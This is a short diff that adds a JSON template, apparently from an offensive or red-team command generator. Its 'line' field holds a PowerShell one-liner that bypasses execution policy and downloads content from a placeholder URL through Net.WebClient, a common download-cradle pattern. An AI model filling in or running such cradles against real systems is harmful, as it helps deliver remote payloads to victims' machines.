@@ -1,0 +1,6 @@
+{
+	"line": "powershell -exec bypass -command '(New-Object Net.WebClient).downloadString(\"URL\")'",
+	"variables": {
+        "URL": "URL"
+	}
+}
